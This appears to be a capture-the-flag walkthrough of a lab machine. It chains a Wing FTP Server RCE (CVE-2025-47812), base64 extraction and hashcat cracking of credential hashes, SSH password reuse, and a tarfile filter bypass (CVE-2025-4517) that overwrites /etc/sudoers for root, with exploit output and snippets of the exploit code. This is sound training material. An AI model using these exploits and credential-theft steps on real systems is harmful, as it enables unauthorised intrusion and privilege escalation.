---
tags:
        #CVE-2025-47812
        #WingFTP
        #Tarfile
        #CVE-2025-4517
        #Sudo
        #Python
        #RabbitHole
        #Bypass
---

## 1. Enumeration

### Nmap Scan
The initial reconnaissance began with an Nmap scan to identify active services on the target machine.

```bash
nmap -sC -sV 10.129.244.106 -Pn

Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 22:56 +0800
Nmap scan report for 10.129.244.106
Host is up (0.090s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan identifies an SSH service and an Apache web server. I also discovered a subdomain: `ftp.wingdata.htb`.

---

## 2. Initial Access (Wing FTP Server RCE)

I targeted the Wing FTP Server running on the `ftp` subdomain, which was identified as vulnerable to **CVE-2025-47812**.

### Exploitation (CVE-2025-47812)
I used a Python exploit to gain unauthenticated RCE.

```bash
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb
[*] Targeting http://ftp.wingdata.htb
[*] Logging in with injected payload...
[*] Triggering payload...
[+] Target is vulnerable! Command output:
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
[+] Shell opened. Type 'exit' or Ctrl+C to quit.
```

### Initial Post-Exploitation Commands
Upon gaining a shell, I immediately began exploring the file system.

```bash
Shell> ls
Data
License.txt
Log
lua
pid-wftpserver.pid
README
session
session_admin
version.txt
webadmin
webclient
wftpconsole
wftp_default_ssh.key
wftp_default_ssl.crt
wftp_default_ssl.key
wftpserver

Shell> id
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)

Shell> ls -l
total 26496
drwxr-x---  4 wingftp wingftp     4096 Apr  9 10:53 Data
-rwxr-x---  1 wingftp wingftp     4834 Jul 31  2018 License.txt
drwxr-x---  5 wingftp wingftp     4096 Apr  9 11:29 Log
drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 lua
-rw-r--r--  1 wingftp wingftp        5 Apr  9 10:53 pid-wftpserver.pid
-rwxr-x---  1 wingftp wingftp     1434 Sep 13  2020 README
drwxr-x---  2 wingftp wingftp     4096 Apr  9 11:29 session
drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 session_admin
-rwxr-x---  1 wingftp wingftp   115258 Mar 26  2025 version.txt
drwxr-x--- 10 wingftp wingftp    12288 Feb  9 08:19 webadmin
drwxr-x--- 13 wingftp wingftp     4096 Feb  9 08:19 webclient
-rwxr-x---  1 wingftp wingftp  4649509 Sep 14  2021 wftpconsole
-rwxr-x---  1 wingftp wingftp     3272 Nov  2 11:11 wftp_default_ssh.key
-rwxr-x---  1 wingftp wingftp     1342 Nov 22  2017 wftp_default_ssl.crt
-rwxr-x---  1 wingftp wingftp     1675 Nov 22  2017 wftp_default_ssl.key
-rwxr-x---  1 wingftp wingftp 22283682 Mar 26  2025 wftpserver

Shell> cat wftp_default_ssh.key
```

### Accessing Sensitive Configuration (The Base64 Bypass)
I attempted to find administrative credentials in the `Data` directory.

```bash
Shell> ls -l Data
total 32
drwxr-x--- 4 wingftp wingftp  4096 Feb  9 08:19 1
drwxr-x--- 2 wingftp wingftp  4096 Apr  9 10:53 _ADMINISTRATOR
-rw------- 1 wingftp wingftp 11264 Nov  2 11:11 bookmark_db
-rwxr-x--- 1 wingftp wingftp  2554 Nov  2 16:23 settings.xml
-rwxr-x--- 1 wingftp wingftp   241 Nov  2 11:12 ssh_host_ecdsa_key
-rw-rw-rw- 1 wingftp wingftp  3272 Nov  2 11:52 ssh_host_key

Shell> ls -l Data/_ADMINISTRATOR
total 8
-rwxr-x--- 1 wingftp wingftp 511 Apr  9 10:53 admins.xml
-rwxr-x--- 1 wingftp wingftp 372 Nov  2 16:26 settings.xml
```

**Failed Attempts to Read Files:**
```bash
Shell> cat Data/_ADMINISTRATOR/admins.xml
[-] No output received.
Shell> cat Data/_ADMINISTRATOR/settings.xml
[-] No output received.
Shell> grep -i "Pass" Data/_ADMINISTRATOR/admins.xml
session expired
```

I successfully bypassed these restrictions by using `base64` to encode the file content for retrieval.

The shell restricted direct file output, likely due to terminal limitations or specific filtering. Using base64 allowed for a clean data exfiltration of configuration files.

```bash
Shell> base64 Data/_ADMINISTRATOR/admins.xml
PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8QURNSU5fQUNDT1VOVFMgRGVzY3JpcHRpb249Ildpbmcg
RlRQIFNlcnZlciBBZG1pbiBBY2NvdW50cyI+CiAgICA8QURNSU4+CiAgICAgICAgPEFkbWluX05h
bWU+YWRtaW48L0FkbWluX05hbWU+CiAgICAgICAgPFBhc3N3b3JkPmE4MzM5ZjhlNDQ2NWE5YzQ3
MTU4Mzk0ZDhlZmU3Y2M0NWE1ZjM2MWFiOTgzODQ0Yzg1NjJiZWYyMTkzYmFmYmE8L1Bhc3N3b3Jk
PgogICAgICAgIDxUeXBlPjA8L1R5cGU+CiAgICAgICAgPFJlYWRvbmx5PjA8L1JlYWRvbmx5Pgog
ICAgICAgIDxJc0RvbWFpbkFkbWluPjA8L0lzRG9tYWluQWRtaW4+CiAgICAgICAgPERvbWFpbkxp
c3Q+PC9Eb21haW5MaXN0PgogICAgICAgIDxNeURpcmVjdG9yeT48L015RGlyZWN0b3J5PgogICAg
ICAgIDxFbmFibGVUd29GYWN0b3I+MDwvRW5hYmxlVHdvRmFjdG9yPgogICAgICAgIDxUd29GYWN0
b3JDb2RlPjwvVHdvRmFjdG9yQ29kZT4KICAgIDwvQURNSU4+CjwvQURNSU5fQUNDT1VOVFM+Cg==
```

Decoding the base64 revealed the `admin` user's SHA2-256 hash: `a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba`.

---

## 3. Lateral Movement (User Pivot)

### The Admin Hash Rabbit Hole
I attempted to crack the administrator's password, but the attack failed.

```bash
hashcat -m 1400 pass /usr/share/wordlists/rockyou.txt
...
Status...........: Exhausted
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
```

**Personal Reflection:**
> "I noticed that admin login page can't be reach by outer browser, and it's not worthy to get admin on ftp server, moreover, I should check the users on the host before, so I won't fall into a rabbit hole like this wasting time."

### Pivoting to User 'wacky'
I shifted focus to system users and found `wacky.xml` in `/opt/wftpserver/Data/1/users/`.

**Learning Point:**
> "I first hashcat the password with no slat before and it didn't work, so I checked the password policy on wingftp, I should done this earlier."

After checking the policy and adding the salt `WingFTP`, I successfully cracked the password.

```bash
hashcat -m 1410 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP /usr/share/wordlists/rockyou.txt
...
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```
Note : Mode 1410: SHA2-256 (Password + Salt).

### SSH Initial Access
The password reuse between the FTP server and the host allowed me to log in via SSH.

```bash
ssh wacky@10.129.17.45
wacky@10.129.17.45's password: !#7Blushing^*Bride5
```

---

## 4. Privilege Escalation (Root)

### Enumeration as 'wacky'
I checked for sudo privileges:

```bash
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass,
    secure_path=/usr/local/bin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

### Failed Escalation Attempts
I tried several standard privilege escalation techniques that did not work:
*   **Direct Python Shell:**
    ```bash
    wacky@wingdata:~$ sudo /usr/local/bin/python3 -c 'import os; os.system("/bin/bash")'
    Sorry, user wacky is not allowed to execute '/usr/local/bin/python3 -c import os; os.system("/bin/bash")' as root on wingdata.
    ```
*   **Other Checks:** "I tried getcap, SUID, Kernel, vulnerable Service, cron, editing passwd files, but failed."
*   **PYTHONPATH Hijacking:**
    ```bash
    wacky@wingdata:~$ python3 -c "import sys; print(sys.path)"
    ['', '/usr/local/lib/python312.zip', '/usr/local/lib/python3.12', '/usr/local/lib/python3.12/lib-dynload', '/usr/local/lib/python3.12/site-packages']
    ```
    I tried modifying `$PYTHONPATH`, but it failed due to the `env_reset` configuration in the sudoers file.

### Sudo vs. Environment Variables (Notes)
I recorded the following technical notes on why my environment injection failed:
*   **env_reset (Default On):** Wipes almost all environment variables, including `PYTHONPATH`, when running sudo.
*   **secure_path:** Restricts `$PATH` to a minimal set of directories.
*   **env_keep:** Requires a whitelist for variables to pass through `env_reset`.
*   **sudo -E:** Only works if the user has specific permissions.
*   **SETENV Tag:** Not present in the current `sudo -l` output.

### Analyzing the Target Script
I examined `/opt/backup_clients/restore_backup_clients.py`:

```python
#!/usr/bin/env python3
# ... (Validation logic for backup and restore directory)
    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
# ...
```

The script uses `tarfile.extractall` with a `data` filter, which was thought to be safe but is vulnerable to **CVE-2025-4517**.

### Final Exploitation (CVE-2025-4517)
I checked the Python version:
```bash
wacky@wingdata:~$ python3 --version
Python 3.12.3
```

I then used an exploit script to craft a malicious tarball that bypasses symlink and hardlink protections to overwrite `/etc/sudoers`.

```bash
wacky@wingdata:~$ python3 exploit.py --create-only

[*] Phase 1: Building nested directory structure...
[*] Phase 2: Creating symlink chain for path traversal...
[*] Phase 3: Creating escape symlink to /etc...
[*] Phase 4: Creating hardlink to /etc/sudoers...
[*] Phase 5: Writing sudoers entry...
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[*] Deploying exploit to: /opt/backup_clients/backups/backup_9999.tar
[+] Exploit deployed successfully

[*] Triggering extraction via vulnerable script...
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999

[*] Verifying exploit success...
[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL
```

### Root Access
With the modified sudoers file, I successfully spawned a root shell.

```bash
[?] Spawn root shell now? (y/n): y
[*] Spawning root shell...
[*] Run: sudo /bin/bash
root@wingdata:/home/wacky# cat /root/root.txt
2fb630806bc751c2694a3ee9d9c895b9
```

# CVE-2025-4517 breakdown

---

 ## Deep Nested Dirs
```python
comp = 'd' * 247 
path = os.path.join(path, comp) # ddd.../ddd.../ddd...
```
Create a long path to confuse the security system, it may trigger buffer overflow.

## The Escape Symlink
```python
# Create a Symlink pointing to ../../../ ( jump 16 layers)
l.linkname = "../" * len(steps) 

# Create a "escape" link, which eventually points to /etc.
e.linkname = linkpath + "/../../../../../../../etc"
```
A portal, through this Symlink, we actually have access to the /etc.

## The Hardlink Bypass
```python
# Ceate a Hardlink called sudoers_link, pointing to escape /sudoers
f.type = tarfile.LNKTYPE 
f.linkname = "escape/sudoers"
```
Hardlink looks like a normal file, but it actually points to the inode of `/etc/sudoers`.

## Payload Delivery
```python
# Create a file called sudoers_link, but its a normal file.
c.type = tarfile.REGTYPE 
# payload: "username ALL=(ALL) NOPASSWD: ALL" 
tar.addfile(c, fileobj=io.BytesIO(sudoers_entry))
```
When `tarfile.extractall()` reaches this point, it writes the payload to `sudoers_link`. Due to the underlying hardlink structure, this content will directly overwrite `etc/sudoers`.